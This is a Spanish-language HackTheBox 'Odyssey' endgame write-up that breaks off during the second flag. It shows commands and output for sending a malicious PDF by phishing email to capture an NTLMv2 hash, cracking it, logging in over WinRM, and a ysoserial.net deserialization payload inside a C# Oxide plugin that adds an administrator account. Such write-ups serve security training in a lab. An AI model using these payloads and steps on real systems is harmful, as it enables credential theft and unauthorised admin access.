<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackTheBox Odyssey</title>

  <meta name="description" content="Resolución del endgame Odyssey de la plataforma de HackTheBox">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackTheBox Odyssey">
  <meta name="twitter:description" content="Resolución del endgame Odyssey de la plataforma de HackTheBox">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/images/hackthebox/odyssey.png">

  <meta property="og:site_name" content="xchg2pwn">
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackTheBox Odyssey">
  <meta property="og:description" content="Resolución del endgame Odyssey de la plataforma de HackTheBox">
  <meta property="og:image" content="/images/hackthebox/odyssey.png">

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/odyssey.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Odyssey" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover panel-cover--collapsed" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/endgames" title="xchg2pwn" class="blog-button">EndGames</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">

              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>
              
            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#flag1">Inner Orion Arm</a></li>
        <li><a href="#flag2">Strange quark</a></li>
        <li><a href="#flag3">Entanglement</a></li>
        <li><a href="#flag4">Can you see a singularity?</a></li>
        <li><a href="#flag5">Zero Entropy</a></li>
        <li><a href="#flag6">Quantum foam</a></li>
        <li><a href="#flag7">Planck Length</a></li>
        <li><a href="#extra">Extra</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackTheBox</h4>
    <picture><img src="/images/hackthebox/odyssey.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"></picture>
    <h2 class="post-title">Odyssey</h2><br>
  </header>
  
<section class="post" id="flag1">
<br><h3 class="post-title">Inner Orion Arm</h3>
<h4 class="post-title">ODYSSEY{k4r3Ful_WI7h_pDf_FiL32}</h4><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos la mayoria parecen ser los de un <code class="language-plaintext highlighter-rouge">windows</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ nmap </span><span class="p">10.13.38.21
Nmap scan report for 10.13.38.21  
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
587/tcp   open  submission
5985/tcp  open  wsman
28016/tcp open  unknown
28083/tcp open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown</span>
</code></pre></div></div><br>

<p class="plain-text">El puerto smb esta abierto, podemos el nombre de la maquina que es <code class="language-plaintext highlighter-rouge">online</code> pero no pertenece a ningun dominio sino que es una maquina <code class="language-plaintext highlighter-rouge">windows</code> independiente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.13.38.21                                                                  
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ONLINE) (domain:online) (signing:False) (SMBv1:False)  </span>
</code></pre></div></div><br>

<p class="plain-text">En la pagina principal en el apartado de informacion nos hablan sobre servidores de <code class="language-plaintext highlighter-rouge">rust</code> y mods para <code class="language-plaintext highlighter-rouge">oxide</code> mejorando rendimiento ademas de algunas imagenes</p>
<a href="/endgames/odyssey/1.png" target="_blank"><div><p><img src="/endgames/odyssey/1.png"></p></div></a>

<p class="plain-text">La primera imagen llama la atencion y es que de fondo ademas de la <code class="language-plaintext highlighter-rouge">cmd</code> corriendo vemos un acceso directo a <code class="language-plaintext highlighter-rouge">Adobe Reader 9</code> por lo que podria estar instalado</p>
<a href="/endgames/odyssey/3.png" target="_blank"><div><p><img src="/endgames/odyssey/3.png"></p></div></a>

<p class="plain-text">Un poco mas abajo nos encontramos con un correo de soporte <code class="language-plaintext highlighter-rouge">invoice@odyssey.htb</code></p>
<a href="/endgames/odyssey/2.png" target="_blank"><div><p><img src="/endgames/odyssey/2.png"></p></div></a>

<p class="plain-text">En el siguiente <a href="https://research.checkpoint.com/2018/ntlm-credentials-theft-via-pdf-files/">articulo</a> nos muestran una posible forma de obtener una peticion y un hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> a través de un pdf en versiones antiguas de <code class="language-plaintext highlighter-rouge">Adobe</code> y <code class="language-plaintext highlighter-rouge">Foxit</code>, asi que usando <a href="https://github.com/deepzec/Bad-Pdf">BadPDF</a> podemos crear un pdf malicioso indicando nuestro host e interfaz</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo python2 </span><span class="p">badpdf.py

        ______                 __       _______  ______   ________  
        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|

        Author : Deepu TV ; Alias DeepZec 

        =============================================================  
        
Responder detected :/usr/sbin/responder
Please enter Bad-PDF host IP: 
10.10.14.10
Please enter output file name: 
test.pdf
Please enter the interface name to listen(Default eth0): 
tun0
[*] Starting Process.. [*]
Bad PDF test.pdf created
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
</span><span class="am">
           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
</span><span class="ve">
[+] </span><span class="p">Listening for events...</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos un correo, a traves de <code class="language-plaintext highlighter-rouge">smtp</code> podemos enviar un correo de phishing a <code class="language-plaintext highlighter-rouge">invoice</code> adjuntandole el <code class="language-plaintext highlighter-rouge">pdf</code> incitando a que lo abra y nos envie la peticion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ swaks </span><span class="p">--to invoice@odyssey.htb --from test@odyssey.htb --header </span><span class="am">"Subject: Problem on the server"</span><span class="p"> --server 10.13.38.21 --attach test.pdf  
=== Trying 10.13.38.21:25...
=== Connected to 10.13.38.21.
&lt;-  220 ONLINE ESMTP
 -&gt; EHLO kali
&lt;-  250-ONLINE
&lt;-  250-SIZE 20480000
&lt;-  250-AUTH LOGIN
&lt;-  250 HELP
 -&gt; MAIL FROM:&lt;test@odyssey.htb&gt;
&lt;-  250 OK
 -&gt; RCPT TO:&lt;invoice@odyssey.htb&gt;
&lt;-  250 OK
 -&gt; DATA
&lt;-  354 OK, send.
 -&gt; To: invoice@odyssey.htb
 -&gt; From: test@odyssey.htb
 -&gt; Subject: Problem on the server
 -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -&gt; 
 -&gt; .
&lt;-  250 Queued (1.168 seconds)
 -&gt; QUIT
&lt;-  221 goodbye
=== Connection closed with remote host.</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de unos segundos obtenemos una autenticacion como el usuario <code class="language-plaintext highlighter-rouge">elpenor</code> que se traduce en responder a un <code class="language-plaintext highlighter-rouge">hash</code> de este usuario en formato <code class="language-plaintext highlighter-rouge">NTLMv2</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">[+] </span><span class="p">Listening for events...

</span><span class="az">[SMB] </span><span class="p">NTLMv2-SSP Client   : </span><span class="am">10.13.38.21
</span><span class="az">[SMB] </span><span class="p">NTLMv2-SSP Username : </span><span class="am">ONLINE\elpenor
</span><span class="az">[SMB] </span><span class="p">NTLMv2-SSP Hash     : </span><span class="am">elpenor::ONLINE:1122334455667788:76648058671B85ABBFACBA7C04CB33A7:0101000000000000004DCAC7B5DAD901FDCC4AA06846D3BE000000000200080053004A003000470001001E00570049004E002D005100320046004D005200420037004F0059005300310004003400570049004E002D005100320046004D005200420037004F005900530031002E0053004A00300047002E004C004F00430041004C000300140053004A00300047002E004C004F00430041004C000500140053004A00300047002E004C004F00430041004C0007000800004DCAC7B5DAD90106000400020000000800300030000000000000000000000000200000B77744339FDFDD27F36FF0EA8EDEA82420E687A41F0722354674D948AC7186640A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000  </span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo la contraseña es demasiado debil y la logramos crackear usando <code class="language-plaintext highlighter-rouge">john</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">superman         </span><span class="p">(</span><span class="am">elpenor</span><span class="p">)
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed.</span>
</code></pre></div></div><br>

<p class="plain-text">Al comprobar la contraseña de elpenor con <code class="language-plaintext highlighter-rouge">crackmapexec</code> nos encontramos con que es valida tanto para el servicio smb como para <code class="language-plaintext highlighter-rouge">winrm</code> ya que devuelve Pwned!</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.13.38.21 -u elpenor -p superman
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ONLINE) (domain:ONLINE) (signing:False) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="ve">[+] </span><span class="p">ONLINE\elpenor:superman 

</span><span class="ve">❯ crackmapexec </span><span class="p">winrm 10.13.38.21 -u elpenor -p superman
</span><span class="az">SMB         </span><span class="p">10.13.38.21     5985   ONLINE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:ONLINE) (domain:ONLINE)
</span><span class="az">HTTP        </span><span class="p">10.13.38.21     5985   ONLINE           </span><span class="az">[*] </span><span class="p">http://10.13.38.21:5985/wsman
</span><span class="az">HTTP        </span><span class="p">10.13.38.21     5985   ONLINE           </span><span class="ve">[+] </span><span class="p">ONLINE\elpenor:superman </span><span class="am">(Pwn3d!)</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>, obtener una shell y leer la flag</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i 10.13.38.21 -u elpenor -p superman
PS C:\Users\elpenor\Documents&gt; </span><span class="am">whoami</span><span class="p">
online\elpenor
PS C:\Users\elpenor\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt  
ODYSSEY{k4r3Ful_WI7h_pDf_FiL32}
PS C:\Users\elpenor\Documents&gt;</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag2">
<br><h3 class="post-title">Strange quark</h3>
<h4 class="post-title">ODYSSEY{Ded1CA7eD_rU57_5ERVeR}</h4><br>

<p class="plain-text">Navegando entre directorios encontramos uno llamado <code class="language-plaintext highlighter-rouge">rustserver</code>, el cual dentro tiene otro llamado <code class="language-plaintext highlighter-rouge">oxide</code>, del cual se nos hablaba antes en un apartado de la web</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\rustserver\oxide&gt; </span><span class="am">dir</span><span class="p">

    Directory: C:\rustserver\oxide

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/14/2021   7:05 AM                config
d-----        3/14/2021   7:19 AM                data
d-----        3/14/2021   7:05 AM                lang
d-----         5/6/2022   2:42 AM                logs
d-----        7/24/2021   1:12 PM                plugins
-a----        3/14/2021   7:05 AM            431 oxide.config.json  

PS C:\rustserver\oxide&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Curiosamente en el directorio de <code class="language-plaintext highlighter-rouge">plugins</code> podemos escribir por lo que podriamos subir un plugin escrito en <code class="language-plaintext highlighter-rouge">C#</code> ayudandonos de la <a href="https://umod.org/documentation/api/getting-started">documentacion</a> para crearlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\rustserver\oxide\plugins&gt; </span><span class="am">icacls </span><span class="p">.
. BUILTIN\Users:(OI)(CI)(W)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(AD)
  BUILTIN\Users:(I)(CI)(WD)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files  
PS C:\rustserver\oxide\plugins&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Para aprovecharnos de esto crearemos una data <code class="language-plaintext highlighter-rouge">serializada</code> en base64 que cree un usuario <code class="language-plaintext highlighter-rouge">pwned</code> que sea administrador, para ello usaremos <a href="https://github.com/pwntester/ysoserial.net/">ysoserial</a> indicando el formato <code class="language-plaintext highlighter-rouge">BynaryFormatter</code> que usaremos, ademas que lo queremos en <code class="language-plaintext highlighter-rouge">base64</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\CTF\ysoserial&gt; </span><span class="am">.\ysoserial.exe</span><span class="c1"> -f </span><span class="p">BinaryFormatter </span><span class="c1">-g </span><span class="p">TypeConfuseDelegateMono </span><span class="c1">-o </span><span class="p">base64 </span><span class="c1">-c </span><span class="az">"net user pwned password123# /add &amp;&amp; net localgroup Administrators pwned /add"</span><span class="p">
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAE8vYyBuZXQgdXNlciBwd25lZCBwYXNzd29yZDEyMyMgL2FkZCAmJiBuZXQgbG9jYWxncm91cCBBZG1pbmlzdHJhdG9ycyBwd25lZCAvYWRkBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCQAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgoAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GCwAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBgwAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYNAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg4AAAAFU3RhcnQJDwAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkOAAAACQwAAAAJDQAAAAYTAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEPAAAACAAAAAkKAAAACQsAAAAKCQwAAAAJDQAAAAkOAAAACgs=  
PS C:\CTF\ysoserial&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Basandonos en el ejemplo de la <a href="https://umod.org/documentation/api/getting-started">documentación</a> podemos crear un codigo simple en <code class="language-plaintext highlighter-rouge">C#</code> que interprete nuestra data serializada a traves del objeto <code class="language-plaintext highlighter-rouge">BinaryFormatter</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="o">using </span><span class="p">System;
</span><span class="o">using </span><span class="p">System.IO;
</span><span class="o">using </span><span class="p">System.Runtime.Serialization.Formatters.Binary;

</span><span class="no">namespace </span><span class="na">Oxide.Plugins</span><span class="p">
{
    [Info(</span><span class="s">"Epic Stuff"</span><span class="p">, </span><span class="s">"Unknown Author", "0.1.0"</span><span class="p">)]
    [Description(</span><span class="s">"Makes epic stuff happen"</span><span class="p">)]
    </span><span class="no">class EpicStuff </span><span class="p">: </span><span class="na">CovalencePlugin</span><span class="p">
    {
        </span><span class="o">private </span><span class="no">void </span><span class="na">Init</span><span class="p">()
        {
            </span><span class="no">byte</span><span class="p">[] payload </span><span class="o">= </span><span class="p">Convert.FromBase64String(</span><span class="s">"AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAE8vYyBuZXQgdXNlciBwd25lZCBwYXNzd29yZDEyMyMgL2FkZCAmJiBuZXQgbG9jYWxncm91cCBBZG1pbmlzdHJhdG9ycyBwd25lZCAvYWRkBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCQAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgoAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GCwAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBgwAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYNAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg4AAAAFU3RhcnQJDwAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkOAAAACQwAAAAJDQAAAAYTAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEPAAAACAAAAAkKAAAACQsAAAAKCQwAAAAJDQAAAAkOAAAACgs="</span><span class="p">);  
            </span><span class="na">BinaryFormatter </span><span class="p">formatter </span><span class="o">= new </span><span class="na">BinaryFormatter</span><span class="p">();
            </span><span class="na">Stream </span><span class="p">stream </span><span class="o">= new </span><span class="na">MemoryStream</span><span class="p">(payload);
            </span><span class="no">object </span><span class="p">obj </span><span class="o">= </span><span class="p">formatter.Deserialize(stream);
        }
    }
}</span>
</code></pre></div></div><br>

